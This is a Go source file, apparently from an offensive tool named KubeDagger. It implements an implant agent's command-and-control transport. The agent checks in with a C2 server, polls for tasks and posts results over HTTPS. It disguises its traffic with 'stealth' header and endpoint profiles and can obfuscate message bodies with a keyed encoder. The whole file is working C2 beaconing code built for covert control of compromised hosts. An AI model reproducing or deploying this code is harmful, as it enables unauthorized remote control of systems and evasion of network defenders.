package agent

import (
	"bytes"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"time"

	"github.com/yasindce1998/KubeDagger/pkg/agent/stealth"
	"github.com/yasindce1998/KubeDagger/pkg/c2server"
)

type TransportConfig struct {
	Endpoints  stealth.EndpointProfile
	Obfuscate  bool
	ObfuscKey  string
	PSK        string
}

type Transport struct {
	client    *http.Client
	baseURL   string
	headers   *stealth.HeaderProfile
	encoder   *stealth.Encoder
	endpoints stealth.EndpointProfile
	psk       string
}

func NewTransport(serverURL string, tlsCfg *tls.Config, tcfg TransportConfig) *Transport {
	transport := &http.Transport{
		TLSClientConfig:     tlsCfg,
		ForceAttemptHTTP2:   true,
		MaxIdleConns:        1,
		IdleConnTimeout:     120 * time.Second,
		DisableCompression:  true,
		TLSHandshakeTimeout: 10 * time.Second,
	}

	endpoints := tcfg.Endpoints
	if endpoints.Checkin == "" {
		endpoints = stealth.DefaultProfile()
	}

	var encoder *stealth.Encoder
	if tcfg.Obfuscate && tcfg.ObfuscKey != "" {
		encoder = stealth.NewEncoder(tcfg.ObfuscKey)
	}

	return &Transport{
		client: &http.Client{
			Transport: transport,
			Timeout:   30 * time.Second,
		},
		baseURL:   serverURL,
		headers:   stealth.NewHeaderProfile(),
		encoder:   encoder,
		endpoints: endpoints,
		psk:       tcfg.PSK,
	}
}

func (t *Transport) Checkin(req c2server.CheckinRequest) (*c2server.CheckinResponse, error) {
	var resp c2server.CheckinResponse
	if err := t.post(t.endpoints.Checkin, req, &resp); err != nil {
		return nil, err
	}
	return &resp, nil
}

func (t *Transport) GetTask(agentID string) (*c2server.TaskResponse, error) {
	req := c2server.TaskRequest{AgentID: agentID}
	var resp c2server.TaskResponse
	if err := t.post(t.endpoints.Task, req, &resp); err != nil {
		return nil, err
	}
	if resp.TaskID == "" {
		return nil, nil
	}
	return &resp, nil
}

func (t *Transport) SendResult(result c2server.ResultRequest) error {
	var resp c2server.ResultResponse
	return t.post(t.endpoints.Result, result, &resp)
}

func (t *Transport) post(path string, body any, out any) error {
	data, err := json.Marshal(body)
	if err != nil {
		return fmt.Errorf("marshal: %w", err)
	}

	if t.encoder != nil {
		data, err = t.encoder.Encode(data)
		if err != nil {
			return fmt.Errorf("encode: %w", err)
		}
	}

	req, err := http.NewRequest(http.MethodPost, t.baseURL+path, bytes.NewReader(data))
	if err != nil {
		return fmt.Errorf("new request %s: %w", path, err)
	}

	req.Header.Set("Content-Type", "application/json")
	t.headers.ApplyHeaders(req)
	if t.psk != "" {
		req.Header.Set("X-Api-Key", t.psk)
	}

	resp, err := t.client.Do(req)
	if err != nil {
		return fmt.Errorf("request %s: %w", path, err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusNoContent {
		return nil
	}

	if resp.StatusCode != http.StatusOK {
		msg, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
		return fmt.Errorf("%s returned %d: %s", path, resp.StatusCode, string(msg))
	}

	if out != nil {
		respBody, err := io.ReadAll(io.LimitReader(resp.Body, 1<<20))
		if err != nil {
			return fmt.Errorf("read %s response: %w", path, err)
		}

		if t.encoder != nil {
			respBody, err = t.encoder.Decode(respBody)
			if err != nil {
				return fmt.Errorf("decode response %s: %w", path, err)
			}
		}

		if err := json.Unmarshal(respBody, out); err != nil {
			return fmt.Errorf("decode %s response: %w", path, err)
		}
	}
	return nil
}
